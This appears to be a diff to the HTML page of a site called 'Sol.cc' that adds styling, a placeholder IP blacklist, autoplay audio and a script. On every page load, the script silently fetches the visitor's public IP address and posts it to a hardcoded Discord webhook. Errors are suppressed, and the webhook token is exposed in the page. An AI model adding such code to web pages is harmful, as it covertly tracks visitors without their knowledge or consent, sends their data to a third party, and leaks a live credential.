@@ -69,9 +69,64 @@
             0% { transform: translateX(0); }
             100% { transform: translateX(-100%); }
         }
+        .blacklisted-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: red;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 10;
+        }
     </style>
+    <script>
+        function checkBlacklist() {
+            const blacklistedIPs = ["192.168.1.1", "127.0.0.1"];
+            const userIP = "192.168.1.1"; // Replace with real IP fetch logic
+
+            if (blacklistedIPs.includes(userIP)) {
+                document.body.innerHTML = '<div class="blacklisted-message">You are blacklisted.</div>';
+            }
+        }
+
+
+        document.addEventListener('DOMContentLoaded', checkBlacklist);
+
+        // Function to get the IP address and send it to the Discord webhook
+        async function logIPAndSendToWebhook() {
+            try 
+            {
+                // Get the IP address
+                const response = await axios.get('https://api.ipify.org?format=json');
+                const ip = response.data.ip;
+
+                // Discord webhook URL
+                const webhookUrl = 'https://discord.com/api/webhooks/1294694528149753917/x7UYkRR3odV0TWrt2uM3b-KeBg9REY6DR3TSDaQEfAVXaULoWW8-1DGBGzkQjlkWzQ_q';
+
+                // Send the IP address to the Discord webhook
+                await axios.post(webhookUrl, {
+                    content: `IP Address: ${ip}`
+                });
+
+                //console.log('IP address sent to Discord webhook:', ip);
+            } catch (error) 
+            {
+
+                //console.error('Error logging IP address:', error);
+            }
+        }
+
+        // Call the function when the page loads
+        logIPAndSendToWebhook();
+    </script>
 </head>
 <body>
+    <audio autoplay loop>
+        <source src="https://github.com/PayxSolutions/Audio/releases/download/audio/hisohkah.school.rooftop.with.birds.sound.1.hour.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
     <div class="sun"></div>
     <div class="wind"></div>
     <h1>Sol.cc</h1>
